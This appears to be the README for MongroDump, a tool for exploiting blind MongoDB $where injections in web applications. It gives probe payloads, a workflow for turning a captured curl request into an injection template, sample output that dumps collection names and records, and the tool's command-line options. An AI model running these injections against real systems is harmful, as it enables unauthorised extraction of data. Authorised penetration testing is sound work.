Description
===========

MongroDump exists first and foremost to exploit blind MongoDB injections.

While many programs exist to find NoSQL injections MongroDump is focused on
exploiting them and actually getting the data out.

Usage
=====

MongroDump only supports a rather specific use case right now: a web-based
MongoDB blind $where injection where a good request and a bad one produce
different web pages.

Although testing for injections is planned at the time it is not present. You
may refer to external resources such as the OWASP_ or `this article`__ for
more information on that matter. MongroDump specializes in $where requests
which are very common and akin to SELECT statements in SQL.

__ securelayer7_

.. _OWASP: https://www.owasp.org/index.php/Testing_for_NoSQL_injection

.. _securelayer7: http://blog.securelayer7.net/mongodb-security-injection-attacks-with-php/

Let's suppose that you found an injection point, and that trying with dummy
values such as **', 7>=8;//** or **', 7<=8;//** gives you two different pages
(for example one containing the word "pancake" and the other an error message
saying "Not found").

First translate that request to a curl command put in a file. Most proxies
can do so such as burp or mitmproxy. Zap too with the community extensions.

Modify that request to include a flag at the injection point. The default
flag is #MONGRODUMP# so you would have something like **', #MONGRODUMP#;//**.
This can be put in any part of the request.

You may then call mongrodump to get the list of all collections:

.. code:: sh

    $ mongrodump -r "curl_cmd.sh" -t "pancake" -f "Not found"
    [+] Dumping collection list
    [-] Number of collections: 2
    [-] String length: 6
    [-] Collections: bakery
    [-] String length: 14
    [-] Collections: system.indexes
    bakery
    system.indexes

So we found two collections. We can now dump the content of a collection:

.. code:: sh

    $ mongrodump -r "curl_cmd.sh" -t "pancake" -f "Not found" -d "bakery"
    [+] Dumping bakery
    [-] String length: 63
    [-] Element: { "_id": "3798a844", "id": 1, "name": "pancake", "price": 8.5 }
    [-] String length: 62
    [-] Element: { "_id": "968c2244", "id": 2, "name": "cookie", "price": 3.5 }
    { "_id": "3798a844", "id": 1, "name": "pancake", "price": 8.5 }
    { "_id": "968c2244", "id": 2, "name": "cookie", "price": 3.5 }

In a blind case 8 requests are needed to recover a single byte. This can be
quite time-consuming, but if you trust the server you may use multithreading
to recover multiple characters at a time.

Roadmap
=======

::

    [+] Dumping database in web, blind $where cases
    [+] Add multithreading
    [ ] Find injection prefix/suffix
    [ ] Find injection points
    [ ] Dumping database in web, blind time-based $where cases
    [ ] Addition of Server-Side JavaScript (SSJS) injections

Command line interface
======================

::

    Usage: mongrodump [options] --request FILE --true REGEX --false REGEX

    Arguments:
        -r, --request FILE      File containing a curl command
                                It should contain the flag at the injection point
        -t, --true  REGEX       Regex determining a valid request
        -f, --false REGEX       Regex determining an invalid request

    Options:
        -h, --help              Print this help and exit
        -v, --version           Print version and exit

        -d, --dump WHAT         What to dump. If not used, dumps the collection
                                names, otherwise dumps the given collection.
        -F, --flag FLAG         Injection flag to use; default: #MONGRODUMP#
        -T, --threads NUM       Use NUM threads. Default is 5.
        -V, --verbosity LEVEL   Set the verbosity level. Default is 2.

Dependencies
============

See `dub.json` for details

- pegged
- dlang-requests

Building
========

This project is managed with dub:

::

    # Building
    $ dub build -b release

    # Testing
    $ dub test

    # Generate the documentation
    $ dub build -b docs

License
=======

This program is under the GPLv3 License.

You should have received a copy of the GNU General Public License
along with this program. If not, see http://www.gnu.org/licenses/.

Author
======

::

    Main developper: Cédric Picard
    Email:           cpicard@openmailbox.org
